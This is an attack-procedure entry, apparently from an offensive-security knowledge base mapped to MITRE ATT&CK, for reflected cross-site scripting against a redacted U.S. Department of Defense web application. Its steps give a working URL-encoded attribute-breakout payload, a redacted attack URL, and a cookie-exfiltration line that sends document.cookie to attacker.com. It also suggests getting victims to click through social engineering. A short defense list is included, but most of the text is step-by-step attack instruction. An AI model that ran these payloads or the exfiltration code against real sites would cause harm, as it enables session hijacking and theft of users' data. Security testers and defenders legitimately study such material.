---
id: proc-uuid-001
name: Injecting-JavaScript-Payload-for-Reflected-XSS
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.341Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - reflected-xss
  - javascript
  - payload-injection
commands: []
platforms:
  - Web
tools: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Injecting JavaScript Payload for Reflected XSS

## Summary

This procedure exploits a reflected cross-site scripting (XSS) vulnerability by injecting a URL-encoded JavaScript payload into a web application parameter, causing the payload to be reflected unsanitized in the server's response and executed in the victim's browser. It demonstrates execution of arbitrary JavaScript, such as alerting the domain or exfiltrating sensitive data like cookies.

## Description

In a reflected XSS attack, user input from a URL parameter is directly echoed back in the HTML response without proper encoding or sanitization, allowing attackers to inject and execute malicious scripts. This procedure targets a U.S. Department of Defense web application where a search or input parameter is vulnerable. The payload leverages HTML attributes like 'autofocus' and 'onfocus' to trigger execution immediately upon page rendering. Prerequisites include identifying the vulnerable endpoint (e.g., via fuzzing or manual testing) and delivering the malicious URL to a victim, such as through social engineering. Expected outcomes include JavaScript execution in the victim's session context, enabling theft of session cookies, bypassing CORS for cross-origin requests, or evading SOAP-based authentication.

## Requirements

1. Access to a web browser for testing and delivery
2. Knowledge of the target URL and vulnerable parameter name (e.g., a search field)
3. Ability to URL-encode payloads (built-in browser tools or online encoders can assist)
4. Victim interaction: The target user must visit the crafted URL

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding (e.g., HTML-encode quotes and angle brackets) on all user inputs
- Use Content Security Policy (CSP) headers to restrict inline script execution
- Deploy Web Application Firewalls (WAFs) to detect and block common XSS payloads
- Monitor server logs for suspicious parameter values containing script tags or event handlers

## Objectives

1. Inject and reflect a JavaScript payload to execute in the browser
2. Demonstrate impacts like cookie exfiltration or security bypasses
3. Validate vulnerability for reporting or remediation

## Instructions

### Step 1: Craft the Payload

**Context**: Create a JavaScript payload that breaks out of the parameter context and injects executable attributes. Use URL encoding to ensure safe transmission.

The base payload is: `onfocus="alert(document.domain)"autofocus="`

URL-encode it to: `%22onfocus%3d%22alert(document.domain)%22autofocus%3d%22`

This works by closing a quoted attribute (e.g., value="...") with ", injecting the onfocus handler, and using autofocus to trigger it on load.

### Step 2: Construct and Deliver the Malicious URL

**Context**: Append the encoded payload to the vulnerable parameter in the target URL and have the victim access it.

Example full URL (redacted for sensitivity):

```url
https://████?███████=%22onfocus%3d%22alert(document.domain)%22autofocus%3d%22&█████████████████=Search
```

- Navigate to this URL in a browser.
- For advanced payloads, replace `alert(document.domain)` with exfiltration code, e.g., `fetch('https://attacker.com?cookie='+document.cookie)`.

**Expected Output**: The page loads, and an alert displays the document domain. Check browser dev tools (F12) for script execution confirmation.

### Step 3: Verify Impact

**Context**: Test for broader impacts like data theft or bypasses.

- Inspect network tab for any outgoing requests if using an exfiltration payload.
- Attempt CORS-bypassing fetches or SOAP requests via console to confirm elevated privileges.

**Expected Output**: Successful alert or data sent to attacker server; no errors in console.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[JavaScript]]
- [[payload-injection]]
